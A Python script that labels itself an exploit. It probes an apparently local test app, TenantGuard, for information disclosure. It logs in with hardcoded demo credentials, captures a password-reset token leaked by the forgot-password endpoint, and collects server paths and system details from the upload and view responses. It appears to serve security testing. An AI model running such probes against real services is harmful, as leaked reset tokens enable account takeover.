#!/usr/bin/env python3

import requests
import json

BASE_URL = "http://localhost:5000"

def exploit_info_disclosure():
    print("[*] Testing information disclosure vulnerabilities...")
    
    # Test password reset token disclosure
    print("[*] Testing password reset token disclosure...")
    
    reset_data = {"email": "demo@tenantguard.com"}
    reset_response = requests.post(f"{BASE_URL}/api/auth/forgot-password", json=reset_data)
    
    if reset_response.status_code == 200:
        result = reset_response.json()
        if 'resetToken' in result:
            print(f"[+] Reset token exposed: {result['resetToken']}")
        else:
            print("[-] Reset token not found in response")
    
    # Test system information disclosure through file upload
    print("[*] Testing system info disclosure...")
    
    # Login first
    login_data = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    if response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    # Create a test file
    test_content = b"Test file for info disclosure"
    files = {'file': ('test.txt', test_content, 'text/plain')}
    data = {'title': 'Test Document', 'description': 'Info disclosure test'}
    
    upload_response = requests.post(f"{BASE_URL}/api/documents/upload",
                                  headers=headers, files=files, data=data)
    
    if upload_response.status_code == 201:
        result = upload_response.json()
        
        # Check for exposed system information
        if 'systemInfo' in result:
            sys_info = result['systemInfo']
            print("[+] System information disclosed:")
            print(f"    Platform: {sys_info.get('platform')}")
            print(f"    Node Version: {sys_info.get('nodeVersion')}")
        
        if 'serverPath' in result:
            print(f"[+] Server path exposed: {result['serverPath']}")
        
        # Test document viewing for more info disclosure
        doc_id = result['document']['_id']
        view_response = requests.get(f"{BASE_URL}/api/documents/{doc_id}/view",
                                   headers=headers)
        
        if view_response.status_code == 200:
            view_result = view_response.json()
            
            if 'fileStats' in view_result:
                file_stats = view_result['fileStats']
                print(f"[+] Full file path exposed: {file_stats.get('fullPath')}")
            
            if 'systemInfo' in view_result:
                sys_info = view_result['systemInfo']
                print(f"[+] Working directory: {sys_info.get('workingDirectory')}")
    
    return True

if __name__ == "__main__":
    exploit_info_disclosure()